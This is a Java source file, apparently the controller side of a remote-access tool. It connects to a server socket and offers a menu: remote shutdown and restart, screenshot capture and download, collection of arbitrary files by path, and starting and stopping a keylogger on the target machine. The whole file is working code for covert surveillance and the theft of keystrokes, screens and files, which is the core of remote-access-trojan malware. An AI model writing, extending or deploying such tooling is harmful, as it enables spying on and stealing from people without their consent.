import java.awt.*;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Scanner;

public class Client {
    public static void main(String[] args) {
        try {
            Socket socket = new Socket("localhost", 5000);
            BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            PrintWriter writer = new PrintWriter(socket.getOutputStream());

            Scanner sc = new Scanner(System.in);
            boolean exit = false;

            while (!exit) {
                System.out.println("\n MENU");
                System.out.println("0. Exit");
                System.out.println("1. Shutdown (After 15')");
                System.out.println("2. Restart (After 15')");
                System.out.println("3. Cancel Shutdown/ Restart");
                System.out.println("4. Screenshot");
                System.out.println("5. Collect File (via user disk address)");
                System.out.println("6. Start keyLogging");
                System.out.println("7. Pause and Return keyLogging");

                int choice = sc.nextInt();
                sc.nextLine();

                switch (choice) {
                    case 0:
                        exit = true;
                        break;

                    case 1:
                        writer.println("shutdown");
                        writer.flush();
                        System.out.println(reader.readLine());
                        break;

                    case 2:
                        writer.println("restart");
                        writer.flush();
                        System.out.println(reader.readLine());
                        break;

                    case 3:
                        writer.println("cancel");
                        writer.flush();
                        System.out.println(reader.readLine());
                        break;

                    case 4:
                        writer.println("screenshot");
                        writer.flush();

                        int imageSize = Integer.parseInt(reader.readLine());
                        byte[] imageBytes = new byte[imageSize];
                        int byteReadImage = socket.getInputStream().read(imageBytes);

                        if (byteReadImage > 0) {
                            System.out.println("Insert image address & name: ");
                            String imageAddress = sc.nextLine();
                            Path imagePath = Paths.get(imageAddress + ".png");
                            Files.write(imagePath, imageBytes);
                            System.out.println("A new screenshot has been added to: " + imageAddress);
                        }
                        break;

                    case 5:
                        System.out.println("Insert the server path to the file: ");
                        String filePathServer = sc.nextLine();
                        writer.println("collect-" + filePathServer);
                        writer.flush();

                        int fileSize = Integer.parseInt(reader.readLine());
                        byte[] fileBytes = new byte[fileSize];
                        int byteReadCollect = socket.getInputStream().read(fileBytes);

                        if (byteReadCollect > 0) {
                            System.out.println("Insert file address & name: ");
                            String fileAddress = sc.nextLine();
                            Path filePathUser = Paths.get(fileAddress);
                            Files.write(filePathUser, fileBytes);
                            System.out.println("A new file has been added to: " + fileAddress);
                        }
                        break;

                    case 6:
                        writer.println("keylogging-start");
                        writer.flush();
                        break;

                    case 7:
                        writer.println("keylogging-end");
                        writer.flush();
                        break;

                    default:
                        throw new AssertionError();
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
